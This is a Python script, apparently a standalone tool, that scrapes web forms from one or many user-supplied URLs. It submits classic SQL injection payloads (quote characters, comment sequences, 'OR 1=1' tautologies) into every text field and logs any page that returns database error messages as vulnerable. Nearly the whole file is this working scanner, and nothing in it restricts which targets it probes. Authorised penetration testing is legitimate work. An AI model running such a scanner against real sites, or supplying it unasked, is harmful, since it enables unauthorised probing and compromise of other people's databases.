import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# SQL Injection Payloads
SQL_PAYLOADS = [
    "'", "\"", "`", "'--", "\"--", "'#", "\"#",
    "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--"
]

# SQL Error patterns
SQL_ERRORS = [
    "you have an error in your sql syntax",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "warning: mysql",
    "mysql_fetch_array()",
    "supplied argument is not a valid mysql",
    "mysql_num_rows()",
    "ORA-00933",
    "ORA-00936",
    "syntax error"
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
}

# Log results
def log_result(message, output):
    with open(output, "a", encoding="utf-8") as f:
        f.write(message + "\n")
    print(message)

# Get forms from URL
def get_forms(url):
    try:
        res = requests.get(url, headers=HEADERS, timeout=20)
        res.raise_for_status()
        soup = BeautifulSoup(res.text, "html.parser")
        return soup.find_all("form")
    except Exception as e:
        print(f"[-] Error fetching forms from {url}: {e}")
        return []

# Extract form details
def get_form_details(form):
    try:
        action = form.get("action")
        method = form.get("method", "get").lower()
        inputs = []

        for input_tag in form.find_all(["input", "textarea", "select"]):
            name = input_tag.get("name")
            if not name:
                continue

            input_type = input_tag.name if input_tag.name != "input" else input_tag.get("type", "text")
            value = ""

            if input_tag.name == "select":
                option = input_tag.find("option", selected=True) or input_tag.find("option")
                value = option.get("value", "") if option else ""
            elif input_tag.name == "textarea":
                value = input_tag.text or ""
            else:
                value = input_tag.get("value", "")

            inputs.append({"name": name, "type": input_type, "value": value})

        return {"action": action, "method": method, "inputs": inputs}
    except Exception as e:
        print(f"[-] Error parsing form: {e}")
        return None

# Submit form with payload
def submit_form(form_details, url, payload):
    try:
        target_url = urljoin(url, form_details['action'])
        data = {}

        for input_field in form_details['inputs']:
            if input_field["type"] in ["text", "search", "textarea", "email", "url", "password"]:
                data[input_field["name"]] = payload
            else:
                data[input_field["name"]] = input_field["value"]

        print(f"[>] Submitting to {target_url} with payload: {payload}")

        if form_details['method'] == "post":
            response = requests.post(target_url, data=data, headers=HEADERS, timeout=10)
        else:
            response = requests.get(target_url, params=data, headers=HEADERS, timeout=10)

        response.raise_for_status()
        return response
    except Exception as e:
        print(f"[-] Error submitting form: {e}")
        return None

# Check response for SQL error patterns
def is_vulnerable(response):
    if response:
        for err in SQL_ERRORS:
            if err.lower() in response.text.lower():
                return True
    return False

# Main scan function
def scan_sql_injection(url, payloads, output):
    log_result(f"[Scanning] {url}", output)
    forms = get_forms(url)
    if not forms:
        log_result("  [-] No forms found.", output)
        return

    log_result(f"  [+] Found {len(forms)} forms.", output)
    for i, form in enumerate(forms, start=1):
        form_details = get_form_details(form)
        if not form_details:
            continue

        for payload in payloads:
            response = submit_form(form_details, url, payload)
            if is_vulnerable(response):
                msg = f"[SQL INJECTION] {url} | Form #{i} | Payload: {payload}"
                log_result(msg, output)

# Load URLs from file
def load_file(filename):
    with open(filename, 'r', encoding='utf-8') as f:
        return [line.strip() for line in f if line.strip()]

# Scan multiple URLs
def scan_urls(urls, payloads, output):
    log_result("[SQL Injection Scan Started]\n", output)
    for url in urls:
        scan_sql_injection(url, payloads, output)
    log_result("\nScan Complete.", output)

# Entry point
if __name__ == "__main__":
    input_type = input("Do you want to scan a single URL or a file? (enter 'url' or 'file'): ").strip().lower()

    output = input("Enter the output filename to save results: ").strip()
    if not output:
        print("You must provide an output filename.")
        exit()

    if input_type == 'url':
        url = input("Enter the URL (with http:// or https://): ").strip()
        scan_urls([url], SQL_PAYLOADS, output)

    elif input_type == 'file':
        file_path = input("Enter the file path containing URLs (one per line): ").strip()
        try:
            urls = load_file(file_path)
            scan_urls(urls, SQL_PAYLOADS, output)
        except Exception as e:
            print(f"Error reading file: {e}")

    else:
        print("Invalid input. Please enter 'url' or 'file'.")

    print("\nScanning completed.")
